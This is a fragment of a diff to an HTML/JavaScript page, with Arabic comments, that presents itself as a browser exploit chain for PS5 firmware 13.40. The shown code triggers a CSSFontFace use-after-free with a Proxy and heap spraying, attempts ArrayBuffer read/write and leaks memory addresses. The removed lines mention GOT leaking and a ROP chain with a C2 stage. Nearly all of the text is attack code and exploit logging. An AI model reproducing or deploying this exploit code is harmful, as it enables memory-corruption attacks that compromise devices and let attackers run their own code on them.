+          if (spray[k]) {
+            spray[k] = null;
+          }
+        }
+        spray.length = 500; // قلص المصفوفة
+        for (let g = 0; g < 50; g++) new ArrayBuffer(8 * 1024 * 1024);
+        return t[prop];
+      }
+    });
+    
+    // إثارة UAF
+    for (let attempt = 0; attempt < 10; attempt++) {
+      try { Object.assign(p, { x: attempt }); } catch(e) {}
+      
+      // اقرأ
+      for (let i = 500; i < Math.min(spray.length, 600); i++) {
+        try {
+          let arr = spray[i];
+          if (arr) {
+            for (let j = 0; j < 3; j++) {
+              let lo = d2lo(arr[j]);
+              let hi = d2hi(arr[j]);
+              if (hi > 0x10000000 || lo > 0x80000000) {
+                L(`[UAF Alt] spray[${i}][${j}] = 0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`, 'ptr');
+                S.leakedAddrs.push({ lo, hi });
+              }
+            }
+          }
+        } catch(e) {}
+      }
+    }
+    
+    if (S.leakedAddrs.length > 0) {
+      L(`[4] ✅ ${S.leakedAddrs.length} عنوان من UAF بديل`, 'crit');
+      updateSB('sLeak', `✅ ${S.leakedAddrs.length}`, true);
+      return true;
+    }
+    
+    L('[4] ❌ فشل', 'err');
+    return false;
   } catch(e) {
-    L('[5] C2: WebSocket فشل', 'warn');
+    L(`[❌] ${e.message}`, 'err');
+    return false;
   }
-  
-  L('[6] ✅ ROP chain جاهزة (تحتاج R/W كامل)', 'ok');
-  return true;
 }
 
 // ============================================================
-// RUN CHAIN
+// RUN ALL
 // ============================================================
-async function chain(phase) {
-  document.getElementById('status').textContent = `تشغيل المرحلة ${phase}...`;
-  
-  switch(phase) {
-    case 1: phase1_UAF(); break;
-    case 2: phase2_primitives(); break;
-    case 3: phase3_RW(); break;
-    case 4: phase4_got(); break;
-    case 5: phase5_rop(); break;
-  }
-  
-  document.getElementById('status').textContent = 'جاهز';
-}
-
-async function runFull() {
+async function runAll() {
   document.getElementById('log').innerHTML = '<div class="crit">[*] تشغيل السلسلة الكاملة...</div>';
   
   L('══════════════════════════════════', 'sep');
-  L('🔥🔥 PS5 13.40 · FULL EXPLOIT CHAIN', 'crit');
+  L('🔥 PS5 13.40 · CSSFontFace UAF Chain', 'crit');
   L('══════════════════════════════════', 'sep');
   
-  // PHASE 1
-  L('', 'sep'); L('── المرحلة 1/5: UAF ──', 'sep');
-  let p1 = phase1_UAF();
+  // المرحلة 1: CSSFontFace UAF
+  L('', 'sep'); L('── المرحلة 1/4: CSSFontFace UAF ──', 'sep');
+  let p1 = await phase1_cssUAF();
   await wait(300);
   
-  // PHASE 2
-  L('', 'sep'); L('── المرحلة 2/5: Primitives ──', 'sep');
+  // المرحلة 2: Heap Spray
+  L('', 'sep'); L('── المرحلة 2/4: Heap Spray ──', 'sep');
   let p2 = false;
-  if (p1) { p2 = phase2_primitives(); }
+  if (p1) { p2 = phase2_spray(); }
   await wait(200);
   
-  // PHASE 3
-  L('', 'sep'); L('── المرحلة 3/5: R/W ──', 'sep');
-  let p3 = phase3_RW();
+  // المرحلة 3: R/W
+  L('', 'sep'); L('── المرحلة 3/4: ArrayBuffer R/W ──', 'sep');
+  let p3 = phase3_rw();
   await wait(200);
   
-  // PHASE 4
-  L('', 'sep'); L('── المرحلة 4/5: GOT Leak ──', 'sep');
-  let p4 = phase4_got();
-  await wait(200);
+  // المرحلة 4: Leak
+  L('', 'sep'); L('── المرحلة 4/4: عناوين الذاكرة ──', 'sep');
+  let p4 = false;
+  if (p1) { p4 = phase4_leak(); }
   
-  // PHASE 5
-  L('', 'sep'); L('── المرحلة 5/5: ROP C2 ──', 'sep');
-  let p5 = phase5_rop();
-  
-  // النتيجة النهائية
+  // النتيجة
   await wait(300);
   L('', 'sep');
   L('══════════════════════════════════', 'sep');
-  L('💀 PS5 13.40 · CHAIN COMPLETE', 'crit');
-  L(`المرحلة 1 (UAF): ${p1 ? '✅' : '❌'}`, p1 ? 'ok' : 'err');
-  L(`المرحلة 2 (Primitives): ${p2 ? '✅' : '❌'}`, p2 ? 'ok' : 'err');
-  L(`المرحلة 3 (R/W): ${p3 ? '✅' : '❌'}`, p3 ? 'ok' : 'err');
-  L(`المرحلة 4 (GOT Leak): ${p4 ? '✅' : '❌'}`, p4 ? 'ok' : 'err');
-  L(`المرحلة 5 (ROP C2): ${p5 ? '✅' : '❌'}`, p5 ? 'ok' : 'err');
+  L('💀 PS5 13.40 · CHAIN RESULT', 'crit');
+  L(`CSSFontFace UAF: ${p1 ? '✅' : '❌'}`, p1 ? 'ok' : 'err');
+  L(`Heap Spray: ${p2 ? '✅' : '❌'}`, p2 ? 'ok' : 'err');
+  L(`ArrayBuffer R/W: ${p3 ? '✅' : '❌'}`, p3 ? 'ok' : 'err');
+  L(`عنوان التسريب: ${p4 ? '✅' : '❌'}`, p4 ? 'ok' : 'err');
   
-  // إحصاءات
-  L('', 'sep');
-  L(`📊 العناوين المسربة: ${S.gotEntries.length}`, 'info');
-  L(`libkernel base: ${S.libKernelBase ? '0x' + S.libKernelBase.toString(16) : 'غير معروف'}`, S.libKernelBase ? 'ptr' : 'warn');
+  if (S.leakedAddrs.length > 0) {
+    L('', 'sep');
+    L('📊 العناوين المسربة:', 'crit');
+    for (let a of S.leakedAddrs.slice(0, 10)) {
+      L(`    0x${a.hi.toString(16).padStart(8,'0')}${a.lo.toString(16).padStart(8,'0')}`, 'ptr');
+    }
+  }
+  
   L('══════════════════════════════════', 'sep');
-  
-  document.getElementById('status').textContent = `${p1 && p2 ? '✅ السلسلة نجحت' : '❌ فشلت'}`;
 }
-
-// Boot
-L('[*] PS5 13.40 Exploit Chain جاهزة', 'info');
-L('[*] لا BigInt — كل شيء Double-based', 'info');
-L('[*] اضغط "تشغيل السلسلة الكاملة"', 'info');
 </script>
 
 </body>
